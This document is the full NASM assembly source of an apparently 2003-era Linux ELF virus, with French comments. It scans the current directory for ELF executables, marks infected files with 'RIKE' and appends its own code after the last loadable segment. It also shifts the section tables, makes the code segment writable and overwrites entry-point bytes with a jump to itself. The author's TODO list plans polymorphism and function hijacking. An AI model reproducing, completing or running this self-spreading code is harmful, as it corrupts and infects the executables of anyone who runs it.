
; s'écrit à la fin du segment data et patche la table des sections
; celui là, c'est le bon !!!!!!!!!!!!
; ne modifie pas l'entrypoint et effectue un décalage à partir du code où écrire de la taille du code à 
; insérer et patche la table des sections et la table des segments qui ont été décalé.
; recherche de tous les elfs présents dans le répertoire courant et s'écrit dedans.
; Fonctionne sur environ bcp d'elfs :).
; Entry Point OverWriting.
; TODO -> Optimiser le code
;      -> puis plein de trucs encore dont polymorphisme, résidence avec hijacking de fonction, bref plein 
;         de trucs pour faire un pire infecteur sous nux !!
; 15/06/2003 -> 1er infecteur sous nux , 1ere parasite et qui fonctionne bien . :)))))))))))))))))))
; 25/05/2003 -> Epo.
; taille du code -> 63fh = 1599 octets >> NEW.
; Testé sur redhat 7.2 avec kernel 2.4.07.
;       sur slack 9.0 avec kernel 2.4.20.
; compilé avec NASM version 0.98.35. et gcc 2.96.
; ./assemble.sh elfinfect.asm
; ./SecWrite elfinfect

global main

section .text
main:
debut:

call delta
delta:
pop ebp
sub ebp, delta
	
lea esi, [ebp+InsTo]
lea edi, [ebp+InsforEpo]
mov ecx, 07h
rep movsb


mov eax, [ebp+LostEp]
mov [ebp+NewEp], eax

mov eax, 05h
lea ebx, [ebp+repert]
xor ecx, ecx
xor edx, edx
int 0x80                           ; open



mov [ebp+ViewEsp], esp
sub esp, 10000h
mov [ebp+NewEsp], esp


mov ebx, eax
mov eax, 220
mov ecx, esp
mov edx, 10000h
int 0x80

mov ebx, 16

babs:
mov edx, ebx
add ebx, 03h
add ebx, esp                    ; à corriger
push edx

mov eax, 05h
mov ecx, 02h
xor edx, edx
int 0x80                           ; open

pop ecx
mov [ebp+DeltaRep], ecx

cmp ah, 0xff
mov esp, [ebp+ViewEsp]
je zut

call Openfile
call SearchLastSegment
call Mapping
call WriteElfHeader
call ModifSectHeader
call Epo
call WriteCode


close:
mov eax, 06h
mov ebx, [ebp+fd]
int 0x80                           ; close.

zut:
pop ecx
mov esp, [ebp+NewEsp]

mov ecx, [ebp+DeltaRep]
xor edx, edx
mov dl, byte [esp+ecx]
test dl, dl
je exit
add ecx, edx
mov ebx, ecx
jmp babs

exit:
test ebp, ebp
jne JmpEp


mov eax, 01h
xor ebx, ebx
int 0x80                           ; on se casse

JmpEp:
mov eax, 04h
mov ebx, 01h
lea ecx, [ebp+Yo]
mov edx, 04h
int 0x80 

lea esi, [ebp+InsforEpo]
mov edi, [ebp+NewEp]
mov ecx, 07h
rep movsb


xor edx, edx
mov esp, [ebp+ViewEsp]
mov eax, [ebp+NewEp]
jmp eax




Openfile:

mov [ebp+fd], eax

xor ecx, ecx
call SYS_LSEEK



lea ecx, [ebp+Header_elf]
mov edx, 34h
call SYS_READ

mov esi, [ebp+Header_elf]
cmp esi, 464C457Fh
jne close

next:
mov si, [ebp+e_type]
cmp si, 0002h
jne close

next1:
mov si, [ebp+e_machine]
cmp si, 0003h
jne close

mov esi, [ebp+Header_elf+0ah]
cmp esi, "RIKE"
je close
mov eax, 0h

ret

SearchLastSegment:

mov eax, [ebp+e_entry]
mov [ebp+LostEp], eax

xor ecx, ecx 
xor eax, eax
mov ax, [ebp+e_phnum]
dec ax
mov cx, [ebp+e_phentsize]
mul cx
mov ebx, [ebp+e_phoff]
add eax, ebx        

rygo:
push eax
mov ecx, eax                             ; LSEEK au début.
call SYS_LSEEK

lea ecx, [ebp+Program_header]
mov edx, 20h
call SYS_READ

mov si, [ebp+p_type]
cmp si, 0001h
je good
pop eax
sub eax, 20h
jmp rygo

good:


mov eax, [ebp+p_vaddr]
add eax, [ebp+p_memsz]
mov [ebp+Epjmp], eax                  ; calcul du nouveau Ep -> au début de .bss

mov eax, [ebp+p_offset]
add eax, [ebp+p_memsz]
mov [ebp+AdrrToWrite], eax              ; calcul de l'endroit où écrire -> au début de .bss

mov eax, [ebp+p_memsz]
sub eax, [ebp+p_filesz]
mov [ebp+SizeBss], eax

mov eax, [ebp+p_offset]
add eax, [ebp+p_filesz]
mov [ebp+OffsetTo], eax   

mov edi, [ebp+p_filesz]
add edi, [ebp+SizeBss]
add edi, fin - debut
mov [ebp+p_filesz], edi

mov edi, [ebp+p_memsz]
add edi, fin - debut
mov [ebp+p_memsz], edi              ; on augmente la taille en mémoire et sur le disque de 30h.




pop ecx
mov [ebp+AddrSegment], ecx

ret





Mapping:
mov eax, 6ch
mov ebx, [ebp+fd]
lea ecx, [ebp+StructFile]
int 0x80

mov eax, [ebp+st_size]
sub eax, [ebp+OffsetTo]
mov [ebp+SizeToWrite],eax

mov eax, 5dh
mov ebx, [ebp+fd]
mov ecx, [ebp+st_size]
add ecx, fin - debut            ; ajouter fin - debut à la place
mov edx, [ebp+AdrrToWrite]
sub edx, [ebp+OffsetTo]
add ecx, edx

mov [ebp+SizeFile], ecx
int 0x80

push 0h				
mov eax, [ebp+fd]
push eax
push 01h
push 03h	
mov ecx, [ebp+SizeFile]
push ecx				
push 0h
mov eax, 5ah				
mov ebx, esp
int 0x80

mov [ebp+AddrMap], eax                          ; c'est ici que ca becte !!!!!

pop eax
pop eax
pop eax
pop eax
pop eax
pop eax

mov [ebp+Regesp], esp
sub esp, [ebp+SizeToWrite]

mov esi, [ebp+OffsetTo]
add esi, [ebp+AddrMap]
mov edi, esp
mov ecx, [ebp+SizeToWrite]
rep movsb

mov esi, esp
mov edi, [ebp+AdrrToWrite]
add edi, [ebp+AddrMap]
add edi, fin - debut

mov ecx, [ebp+SizeToWrite]
rep movsb

mov esp, [ebp+Regesp]

demap:
mov eax, 5bh
mov ecx, [ebp+SizeFile]
push ecx
push 0h
mov ebx, esp
int 0x80

pop eax
pop eax

mov eax, 5dh
mov ebx, [ebp+fd]
mov ecx, [ebp+st_size]
mov edx, [ebp+AdrrToWrite]
sub edx, [ebp+OffsetTo]
add ecx, edx
add ecx, fin - debut
int 0x80


ret

WriteElfHeader:


mov eax, [ebp+e_shoff]
add eax, fin - debut
add eax, [ebp+SizeBss]
mov [ebp+e_shoff], eax


mov esi, "RIKE"
mov [ebp+Header_elf+0ah], esi


xor ecx, ecx                        ; LSEEK
call SYS_LSEEK


lea ecx, [ebp+Header_elf]           ; WRITE
mov edx, 34h
call SYS_WRITE                      ; écriture du nouveau Entrypoint et de la nvelle e_shoff



mov ecx, [ebp+AddrSegment]
call SYS_LSEEK                      ; LSEEK


lea ecx, [ebp+Program_header]
mov edx, 20h                        
call SYS_WRITE                      ; on écrit le nveau Program Header.
 



ret


ModifSectHeader:                      ; le plantage de la section table est dans ce call.

mov ecx, [ebp+e_shoff]                  ; ecx -> adresse de la 1ere section header.
mov dx, [ebp+e_shnum]                 ; nb de section
ska:

push dx
push ecx
call SYS_LSEEK                    ; LSEEK

	

lea ecx, [ebp+Section_header]
mov edx, 28h                      ; READ
call SYS_READ


mov eax, [ebp+e_entry]
mov ebx, [ebp+sh_addr]
cmp ebx, eax
jne suite
mov eax, [ebp+sh_offset]
mov [ebp+AddrEpo], eax

suite:
mov eax, [ebp+sh_offset]
mov ebx, [ebp+OffsetTo]
cmp eax, ebx
jbe dub
add eax, fin - debut
add eax, [ebp+SizeBss]
mov [ebp+sh_offset], eax


roots:

pop ecx
push ecx
call SYS_LSEEK                         ; LSEEK

lea ecx, [ebp+Section_header]
mov edx, 28h
call SYS_WRITE                          ; WRITE
dub:
pop ecx
add ecx, 28h
pop dx
dec dx
cmp dx, 0h
jne ska
ret


Epo:

mov ecx, [ebp+AddrEpo]
call SYS_LSEEK                          ; LSEEK


lea ecx, [ebp+InsTo]
mov edx, 07h
call SYS_READ

mov ecx, [ebp+AddrEpo]
call SYS_LSEEK                         ; LSEEK


lea ecx, [ebp+debutEpo]
mov edx, finEpo - debutEpo             ; WRITE
call SYS_WRITE


mov eax, [ebp+e_phoff]
  
SegmentCode:
push eax
mov ecx, eax
call SYS_LSEEK                        ; LSEEK


lea ecx, [ebp+Program_header]
mov edx, 20h
call SYS_READ

mov si, [ebp+p_type]
cmp si, 0001h
je yes
pop eax
add eax, 20h
jmp SegmentCode

yes:

mov eax, 07h
mov [ebp+p_flags], eax

pop ecx
call SYS_LSEEK                       ; LSEEK


lea ecx, [ebp+Program_header]
mov edx, 20h
call SYS_WRITE                    ; WRITE


ret


WriteCode:


mov ecx, [ebp+AdrrToWrite]
call SYS_LSEEK                       ; LSEEK

lea ecx, [ebp+debut]
mov edx, fin - debut                 ; WRITE
call SYS_WRITE                       ; on écrit le code.
ret


debutEpo:
db 0b8h
Epjmp       dd  0h
jmp eax
finEpo:
  


SYS_READ:

mov eax, 03h
mov ebx, [ebp+fd]
int 0x80                           ; READ
ret


SYS_WRITE:

mov eax, 04h
mov ebx, [ebp+fd]
int 0x80            
ret


SYS_LSEEK:

mov eax, 13h
mov ebx, [ebp+fd]
xor edx, edx
int 0x80                           ; LSEEK
ret



Yo db "Elf",0ah

ProgHead    dd  0h
fd          dd  0h
buffer      dd  0h
NbOfProg    dd  0h
AdrrToWrite dd  0h
AddrMap     dd  0h
SizeFile    dd  0h
SizeToWrite dd  0h
AddrSegment dd  0h
SizeBss     dd  0h
OffsetTo    dd  0h
DeltaRep    dd  0h
ViewEsp     dd  0h
NewEsp      dd  0h
AddrEpo     dd  0h



Header_elf:
e_ident     db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
e_type      dw      0h
e_machine   dw      0h
e_version   dd      0h
e_entry     dd      0h
e_phoff     dd      0h
e_shoff     dd      0h
e_flags     dd      0h
e_ehsize    dw      0h
e_phentsize dw      0h
e_phnum     dw      0h
e_shentsize dw      0h
e_shnum     dw      0h
e_shstrndx  dw      0h


Program_header:
p_type      dd      0h
p_offset    dd      0h
p_vaddr     dd      0h
p_paddr     dd      0h
p_filesz     dd      0h
p_memsz     dd      0h
p_flags     dd      0h
p_align     dd      0h



Section_header:

sh_name     dd      0h
sh_type     dd      0h
sh_flags    dd      0h
sh_addr     dd      0h
sh_offset   dd      0h
sh_size	    dd      0h
sh_link	    dd      0h
sh_info	    dd      0h
sh_addralign dd      0h
sh_entsize  dd      0h


StructFile:

st_dev  	dw   0h
pad1 		dw   0h
st_ino  	dd   0h
st_mode 	dw   0h
st_nlink        dw   0h
st_uid  	dw   0h
st_gid  	dw   0h
st_rdev 	dw   0h
pad2		dw   0h
st_size	        dd   0h
st_blksize      dd   0h
st_blocks	dd   0h
st_atime	dd   0h
unused1	        dd   0h
st_mtime	dd   0h
unused2   	dd   0h
st_ctime	dd   0h
unused3 	dd   0h
unused4	        dd   0h
unused5	        dd   0h


repert        db  ".",0h

LostEp dd 0h
NewEp  dd 0h
Regesp dd 0h

InsTo           db 00h,00h,00h,00h,00h,00h,00h
InsforEpo       db 00h,00h,00h,00h,00h,00h,00h

fin:
